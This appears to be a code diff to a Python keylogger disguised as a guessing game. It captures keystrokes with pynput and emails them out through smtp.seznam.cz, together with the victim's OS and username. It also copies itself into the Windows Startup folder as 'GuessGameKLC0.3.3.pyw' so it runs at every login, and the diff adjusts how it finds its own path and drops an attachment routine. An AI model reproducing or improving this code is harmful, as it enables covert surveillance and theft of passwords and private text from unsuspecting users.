@@ -7,6 +7,7 @@ import datetime
 import platform
 import atexit
 import shutil
+import sys
 from pynput.keyboard import Key, Listener
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -47,17 +48,7 @@ def sendMail():
 
     body = f"Os: {platform.system()}\nUserName: {os.getlogin()}\n\n{f.read()}"
     msg.attach(MIMEText(body,'plain'))
-
-    #Setting up the attachement
-    filename = path #INSERT FILE LOCATION
-    attachment = open(filename, 'rb')
-
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload((attachment).read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition', "attachment; filename= "+filename)
-
-    msg.attach(part)
+    
     text = msg.as_string()
     server = smtplib.SMTP_SSL('smtp.seznam.cz', 465)
     server.login(email_user, email_password)
@@ -70,9 +61,14 @@ def sendMail():
 
 sendMail()
 
-scriptPath = os.path.realpath(__file__)
+try:
+    scriptPath = os.path.realpath(__file__)
+except NameError:
+    scriptPath = os.path.realpath(sys.argv[0])
 
-shutil.copy(scriptPath, f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GuessGameKLC0.3.pyw")
+print(scriptPath)
+
+shutil.copy(scriptPath, f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GuessGameKLC0.3.3.pyw")
 #This function will save the keys
 def onPress(key):
     global keys, count, mailCount, logNumber
